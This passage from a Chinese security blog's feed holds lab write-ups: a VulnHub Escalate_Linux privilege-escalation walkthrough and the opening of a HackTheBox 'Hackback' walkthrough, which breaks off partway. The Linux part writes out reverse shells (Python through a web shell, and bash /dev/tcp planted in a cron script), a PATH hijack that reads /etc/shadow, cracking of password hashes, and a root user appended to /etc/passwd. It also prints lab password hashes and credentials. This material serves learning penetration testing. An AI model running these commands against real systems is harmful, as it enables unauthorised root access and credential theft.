mountd</span><br><span class="line">|   100005  1,2,3      41401/tcp  mountd</span><br><span class="line">|   100021  1,3,4      37122/udp  nlockmgr</span><br><span class="line">|   100021  1,3,4      41115/tcp  nlockmgr</span><br><span class="line">|   100227  3           2049/tcp  nfs_acl</span><br><span class="line">|_  100227  3           2049/udp  nfs_acl</span><br><span class="line">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp   open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">2049/tcp  open  nfs_acl     3 (RPC #100227)</span><br><span class="line">41115/tcp open  nlockmgr    1-4 (RPC #100021)</span><br><span class="line">41401/tcp open  mountd      1-3 (RPC #100005)</span><br><span class="line">41883/tcp open  mountd      1-3 (RPC #100005)</span><br><span class="line">49973/tcp open  mountd      1-3 (RPC #100005)</span><br></pre></td></tr></table></figure><p>80端口就一个Apache默认页面</p><h2 id="枚举目录"><a href="#枚举目录" class="headerlink" title="枚举目录"></a>枚举目录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# gobuster -q -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowerca se.txt -s 200 -x .php,.html -u http://192.168.67.148</span><br><span class="line">/index.html (Status: 200)</span><br><span class="line">/. (Status: 200)</span><br><span class="line">/shell.php (Status: 200)</span><br></pre></td></tr></table></figure><p>看见这个<code>shell.php</code>,一阵激动。<br>注：这里使用过<code>dirb</code>但是没有枚举出来信息，怀疑方法错了，事后通过枚举出来了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# dirb http://192.168.67.148/ /usr/share/dirb/wordlists/big.txt -X .php</span><br></pre></td></tr></table></figure></p><h2 id="python2-7反弹Shell"><a href="#python2-7反弹Shell" class="headerlink" title="python2.7反弹Shell"></a>python2.7反弹Shell</h2><p>访问<code>shell.php</code>,出现提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/*pass cmd as get parameter*/</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/07/24/5d37a36804dca83135.png" alt="2.png"><br><img src="https://i.loli.net/2019/07/24/5d37a5656cfdb32537.png" alt="3.png"><br>我想看看有没有nc，反弹shell，很可惜nc用不起，但是python存在<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.67.148/shell.php</span><br><span class="line">?cmd=python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.67.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br><span class="line">λ nc -nvlp 1234</span><br><span class="line">$ python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br><span class="line"> user6  / | var | www | html  id</span><br><span class="line">id</span><br><span class="line">uid=1005(user6) gid=1005(user6) groups=1005(user6)</span><br></pre></td></tr></table></figure></p><h3 id="提权1"><a href="#提权1" class="headerlink" title="提权1"></a>提权1</h3><p>先下载<code>LinEnum</code>提权脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/LinEnum# python -m SimpleHTTPServer 9999</span><br><span class="line"> user6  / | tmp  wget http://192.168.67.128:9999/LinEnum.sh</span><br><span class="line"> user6  / | tmp  chmod u+x LinEnum.sh</span><br><span class="line"> user6  / | tmp  ./LinEnum.sh</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/07/24/5d37b08481d5c46659.png" alt="4.png"><br><img src="https://i.loli.net/2019/07/24/5d37ecda342b237379.png" alt="5.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> user6  / | tmp  cd /home/user3/</span><br><span class="line"> user6  / | home | user3  ./shell</span><br><span class="line"> root  / | home | user3 id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1005(user6)</span><br></pre></td></tr></table></figure></p><h3 id="弱密码"><a href="#弱密码" class="headerlink" title="弱密码"></a>弱密码</h3><p>通过调用script，获取密码表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> user6  /  cd /tmp</span><br><span class="line"> user6  / | tmp  echo &quot;cat /etc/shadow&quot; &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line"> user6  / | tmp  export PATH=/tmp:$PATH</span><br><span class="line"> user6  / | tmp  cd /home/user5</span><br><span class="line"> user6  / | home | user5  PATH=.:$PATH ./script</span><br><span class="line">cat /etc/shadow </span><br><span class="line">root:$6$mqjgcFoM$X/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSm</span><br><span class="line">user1:$6$9iyn/lCu$UxlOZYhhFSAwJ8DPjlrjrl2Wv.Pz9DahMTfwpwlUC5ybyBGpuHToNIIjTqMLGSh0R2Ch4Ij5gkmP0eEH2RJhZ0:18050:0:99999:7:::</span><br><span class="line">user2:$6$7gVE7KgT$ud1VN8OwYCbFveieo4CJQIoMcEgcfKqa24ivRs/MNAmmPeudsz/p3QeCMHj8ULlvSufZmp3TodaWlIFSZCKG5.:18050:0:99999:7:::</span><br><span class="line">user3:$6$PaKeECW4$5yMn9UU4YByCj0LP4QWaGt/S1aG0Zs73EOJXh.Rl0ebjpmsBmuGUwTgBamqCCx7qZ0sWJOuzIqn.GM69aaWJO0:18051:0:99999:7:::</span><br><span class="line">user4:$6$0pxj6KPl$NA5S/2yN3TTJbPypEnsqYe1PrgbfccHntMggLdU2eM5/23dnosIpmD8sRJwI1PyDFgQXH52kYk.bzc6sAVSWm.:18051:0:99999:7:::</span><br><span class="line">user5:$6$wndyaxl9$cOEaymjMiRiljzzaSaFVXD7LFx2OwOxeonEdCW.GszLm77k0d5GpQZzJpcwvufmRndcYatr5ZQESdqbIsOb9n/:18051:0:99999:7:::</span><br><span class="line">user6:$6$Y9wYnrUW$ihpBL4g3GswEay/AqgrKzv1n8uKhWiBNlhdKm6DdX7WtDZcUbh/5w/tQELa3LtiyTFwsLsWXubsSCfzRcao1u/:18051:0:99999:7:::</span><br><span class="line">user7:$6$5RBuOGFi$eJrQ4/xf2z/3pG43UkkoE35Jb0BIl7AW/umj1Xa7eykmalVKiRKJ4w3vFEOEOtYinnkIRa.89dXtGQXdH.Rdy0:18052:0:99999:7:::</span><br><span class="line">user8:$6$fdtulQ7i$G9THW4j6kUy4bXlf7C/0XQtntw123LRVRfIkJ6akDLPHIqB5PJLD4AEyz7wXsEhMc2XC4CqiTxATfb20xWaXP.:18052:0:99999:7:::</span><br></pre></td></tr></table></figure><p>破解root密码,保存为<code>passwd</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# john passwd</span><br><span class="line">12345            (root)</span><br></pre></td></tr></table></figure></p><p>登录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> user6  / | var | www | html  su -</span><br><span class="line"> root  / | root  id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure></p><h3 id="利用Cronjobs"><a href="#利用Cronjobs" class="headerlink" title="利用Cronjobs"></a>利用Cronjobs</h3><p>上面发现<code>autoscript.sh</code>每五分钟执行一次，拥有root权限<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> user6  / | home | user4 | Desktop  cat autoscript.sh</span><br><span class="line">cat autoscript.sh</span><br><span class="line">touch /home/user4/abc.txt</span><br><span class="line">echo &quot;I will automate the process&quot;</span><br><span class="line">bash -i</span><br></pre></td></tr></table></figure></p><p>发现<code>/etc/passwd</code>可写那么就可以修改修改密码<br><img src="https://i.loli.net/2019/07/25/5d38fb78082f978260.png" alt="6.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> user6  / | tmp  echo &apos;echo &quot;user4:12345&quot; | chpasswd&apos; &gt; ls</span><br><span class="line"> user6  / | tmp  chmod 777 ls</span><br><span class="line"> user6  / | tmp  export PATH=/tmp:$PATH</span><br><span class="line"> user6  / | tmp  cd /home/user5</span><br><span class="line"> user6  / | home | user5  ./script</span><br><span class="line"> user6  / | home | user5  su user4</span><br><span class="line"> user4  /  var  www  html  id</span><br><span class="line">id</span><br><span class="line">uid=1003(user4) gid=1003(user4) groups=1003(user4),0(root)</span><br></pre></td></tr></table></figure></p><p>就可以将<code>user1-user8</code>的密码全部修改为<code>12345</code><br>修改<code>autoscript.sh</code>内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">user4  ~  Desktop  echo &apos;bash -i &gt;&amp; /dev/tcp/192.168.67.128/7777 0&gt;&amp;1&apos; &gt; autoscript.sh</span><br><span class="line">root@kali:~# nc -lvp 7777</span><br><span class="line"> root  /  home  user4  Desktop  id</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure></p><h3 id="vi编辑器提权"><a href="#vi编辑器提权" class="headerlink" title="vi编辑器提权"></a>vi编辑器提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> user8  ~  sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for user8 on osboxes:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User user8 may run the following commands on osboxes:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/vi</span><br></pre></td></tr></table></figure><p>vi编辑器可以用root权限<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> user8  ~  sudo vi </span><br><span class="line">:!sh</span><br><span class="line"># id</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure></p><h3 id="利用-etc-passwd"><a href="#利用-etc-passwd" class="headerlink" title="利用/etc/passwd"></a>利用/etc/passwd</h3><p>在上面发现user7属于root组，并对<code>/etc/passwd</code>有写入权限<br>添加一个新用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> user7  ~  Desktop  openssl passwd -1 -salt user9 12345</span><br><span class="line">$1$user9$xwbm2Fr2pUk5TAV1q4RlA1</span><br><span class="line"> user7  ~  Desktop  echo &apos;user9:$1$user9$xwbm2Fr2pUk5TAV1q4RlA1:0:</span><br><span class="line">0:/root:/bin/bash&apos; &gt;&gt; /etc/passwd</span><br><span class="line"> user7  ~  Desktop  su user9</span><br><span class="line">Password: 12345</span><br><span class="line"># id</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"># python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br><span class="line">root@osboxes:/home/user7/Desktop#</span><br></pre></td></tr></table></figure></p><h3 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a>mysql提权</h3><p>从历史记录中发现有登陆mysql的行为<br>查看配置文件发现密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> user6  / | var | www | html  cat /etc/mysql/my.cnf</span><br><span class="line">#mysql credential user:root &amp; pass:root</span><br><span class="line">root@osboxes:/etc/mysql# mysql -u root -p</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">mysql&gt; select * from user_info;</span><br><span class="line">+----------+-------------+</span><br><span class="line">| username | password    |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| mysql    | mysql@12345 |</span><br><span class="line">+----------+-------------+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> user6  / | var | www | html  su mysql</span><br><span class="line">Password: mysql@12345</span><br><span class="line">mysql@osboxes:~$ chmod 777 .user_informations</span><br><span class="line">mysql@osboxes:~$ cat .user_informations</span><br><span class="line">cat .user_informations</span><br><span class="line">user2:user2@12345</span><br><span class="line">user3:user3@12345</span><br><span class="line">user4:user4@12345</span><br><span class="line">user5:user5@12345</span><br><span class="line">user6:user6@12345</span><br><span class="line">user7:user7@12345</span><br><span class="line">user8:user8@12345</span><br></pre></td></tr></table></figure><p>做到这里，发现自己很尴尬，做反了，但是不影响操作。<br>登录user2，发现可以使用user1的命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> user2  ~  sudo -l</span><br><span class="line">User user2 may run the following commands on osboxes:</span><br><span class="line">    (user1) ALL</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> user2  ~  sudo -u user1 id          </span><br><span class="line">sudo -u user1 id</span><br><span class="line">uid=1000(user1) gid=1000(user1) groups=1000(user1)</span><br></pre></td></tr></table></figure><h1 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h1><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Escalate-Linux-1&quot;&gt;&lt;a href=&quot;#Escalate-Linux-1&quot; class=&quot;headerlink&quot; title=&quot;Escalate_Linux:1&quot;&gt;&lt;/a&gt;Escalate_Linux:1&lt;/h1&gt;&lt;p&gt;主机NET模式&lt;br&gt;实验目的：学习Linux提权新操作（12种操作）&lt;br&gt;项目地址：&lt;a href=&quot;https://www.vulnhub.com/entry/escalate_linux-1,323/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.vulnhub.com/entry/escalate_linux-1,323/&lt;/a&gt;&lt;br&gt;在家休整发现，&lt;code&gt;vulnhub&lt;/code&gt;更新好多有趣的挑战。&lt;br&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全测试" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
      <category term="靶机实验" scheme="http://www.lanbainan.cn/tags/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>对Hackback的测试</title>
    <link href="http://www.lanbainan.cn/2019/07/14/2019-07-14/"/>
    <id>http://www.lanbainan.cn/2019/07/14/2019-07-14/</id>
    <published>2019-07-14T07:58:00.000Z</published>
    <updated>2019-07-23T05:46:49.075Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Hackback"><a href="#Hackback" class="headerlink" title="Hackback"></a>Hackback</h1><p>靶机：10.10.10.128<br>kali：10.10.15.83<br>实验目的：找到flag<br>项目地址：<a href="https://www.hackthebox.eu/home/machines/profile/176" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/176</a><br><a id="more"></a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>masscan、nmap大法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# masscan -e tun0 -p1-65535 10.10.10.128 --rate=2000</span><br><span class="line">Discovered open port 64831/tcp on 10.10.10.128</span><br><span class="line">Discovered open port 80/tcp on 10.10.10.128</span><br><span class="line">Discovered open port 6666/tcp on 10.10.10.128</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -T4 -A -v -p80,6666,64831 10.10.10.128</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods:</span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">6666/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Site doesnt have a title.</span><br><span class="line">64831/tcp open  ssl/unknown</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   FourOhFourRequest:</span><br><span class="line">|     HTTP/1.0 404 Not Found</span><br><span class="line">|     Content-Type: text/plain; charset=utf-8</span><br><span class="line">|     Set-Cookie: _gorilla_csrf=MTU2MzExNzUyMnxJblZaU201bFJ6SkNNM0EyVGpWM1JGVXljbkpzVlZaVU9XdGhVMmxFUkZoRU1uUlVjVVpaTlZkaGJFazlJZ289fHoXSViyQX7JMh2ssjivT-w2ie4GljJeBBDraE3CxtFj; HttpOnly; Secure</span><br><span class="line">|     Vary: Accept-Encoding</span><br><span class="line">|     Vary: Cookie</span><br><span class="line">|     X-Content-Type-Options: nosniff</span><br><span class="line">|     Date: Sun, 14 Jul 2019 15:18:42 GMT</span><br><span class="line">|     Content-Length: 19</span><br><span class="line">|     page not found</span><br><span class="line">|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq:</span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Content-Type: text/plain; charset=utf-8</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Request</span><br><span class="line">|   GetRequest:</span><br><span class="line">|     HTTP/1.0 302 Found</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Location: /login?next=%2F</span><br><span class="line">|     Set-Cookie: _gorilla_csrf=MTU2MzExNzQ4N3xJbTVRYW5vMlNVNVRjV2gzVEdjMWRXODJWR1pZZWk4MWF6SXJiblJRWkZCNEt6WnVSVEJDUzNOWU5tTTlJZ289fHM9UmUFieLG1PlH4n-LguBPZFhXuWIXVHODube95gkf; HttpOnly; Secure</span><br><span class="line">|     Vary: Accept-Encoding</span><br><span class="line">|     Vary: Cookie</span><br><span class="line">|     Date: Sun, 14 Jul 2019 15:18:07 GMT</span><br><span class="line">|     Content-Length: 38</span><br><span class="line">|     href=&quot;/login?next=%2F&quot;&gt;Found&lt;/a&gt;.</span><br><span class="line">|   HTTPOptions:</span><br><span class="line">|     HTTP/1.0 302 Found</span><br><span class="line">|     Location: /login?next=%2F</span><br><span class="line">|     Set-Cookie: _gorilla_csrf=MTU2MzExNzQ4OHxJbXRLYWpjMFlsY3pia2h0WTBsWWNVOTFZa3hyUjBNcmIyUTRNemxMWkVvNFZtaFVPVFZUZFVkamFrRTlJZ289fPlPo9jtOy7SCPPtw6lWQMnAU8hlLEcxaIZxwfiiz1L5; HttpOnly; Secure</span><br><span class="line">|     Vary: Accept-Encoding</span><br><span class="line">|     Vary: Cookie</span><br><span class="line">|     Date: Sun, 14 Jul 2019 15:18:08 GMT</span><br><span class="line">|_    Content-Length: 0</span><br><span class="line">| ssl-cert: Subject: organizationName=Gophish</span><br><span class="line">| Issuer: organizationName=Gophish</span><br><span class="line">| Public Key type: ec</span><br><span class="line">| Public Key bits: 384</span><br><span class="line">| Signature Algorithm: ecdsa-with-SHA384</span><br><span class="line">| Not valid before: 2018-11-22T03:49:52</span><br><span class="line">| Not valid after:  2028-11-19T03:49:52</span><br><span class="line">| MD5:   a00e abee 5be1 2925 7276 a5d7 df2f c1b4</span><br><span class="line">|_SHA-1: 1124 a9ee 28ba 3656 312e a925 c6ea 3010 be63 d1af</span><br></pre></td></tr></table></figure><p>80端口的一头驴<br><img src="https://i.loli.net/2019/07/14/5d2ae27f5ecef26520.png" alt="1.png"><br>6666端口<br><img src="https://i.loli.net/2019/07/14/5d2ae73e9c62419386.png" alt="2.png"><br>64831端口，开着ssl，运行Gophish<br><img src="https://i.loli.net/2019/07/14/5d2af0850bee535210.png" alt="3.png"></p><h2 id="测试ing"><a href="#测试ing" class="headerlink" title="测试ing"></a>测试ing</h2><p>根据提示，测试命令，返回当前可用参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# curl http://10.10.10.128:6666/help</span><br><span class="line">&quot;hello,proc,whoami,list,info,services,netsat,ipconfig&quot;</span><br></pre></td></tr></table></figure></p><p>能够使用默认口令登录Gophish<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin/gophish</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/07/14/5d2af146e60ac62725.png" alt="4.png"><br>仅有的信息<br><img src="https://i.loli.net/2019/07/14/5d2af1de127d919734.png" alt="5.png"><br>从模板中，发现了有趣的东西<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;!-- http://admin.hackback.htb --&gt;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;You have been awarded with the 1st blood. &lt;a href=&quot;http://www.hackthebox.htb&quot;&gt;Catch it now&lt;/a&gt;!&amp;nbsp; &amp;nbsp;&lt;/p&gt;</span><br></pre></td></tr></table></figure></p><p>那么将得到三个域名<code>www.hackthebox.htb</code>，<code>hackthebox.htb</code>和<code>admin.hackback.htb</code>,加入hosts<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.128 www.hackthebox.htb #HTB登录页面</span><br><span class="line">10.10.10.128 hackthebox.htb</span><br><span class="line">10.10.10.128 admin.hackback.htb</span><br></pre></td></tr></table></figure></p><p>也可以使用模糊测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# wfuzz --hc 614 -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-5000.txt -H &quot;HOST: FUZZ.hackback.htb&quot; http://10.10.10.128</span><br></pre></td></tr></table></figure></p><h2 id="url测试"><a href="#url测试" class="headerlink" title="url测试"></a>url测试</h2><p>在<code>admin.hackback.htb</code>发现新的登录界面<br><img src="https://i.loli.net/2019/07/14/5d2af6983e80a81834.png" alt="6.png"><br>在html中发现线索<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- &lt;script SRC=&quot;js/.js&quot;&gt;&lt;/script&gt; --&gt;</span><br></pre></td></tr></table></figure></p><p>直接访问404,测试js<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# gobuster -q -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowerc ase.txt -x js -u http://admin.hackback.htb/js</span><br><span class="line">/private.js (Status: 200)</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://admin.hackback.htb/js/private.js</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/07/14/5d2afa89bbecc51544.png" alt="7.png"><br>这里使用了凯撒加密，<code>ine n=</code>应该是<code>var x=</code>,这很js。<br>v是第22个字母，而i第9个字母。22 - 9 = 13<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span 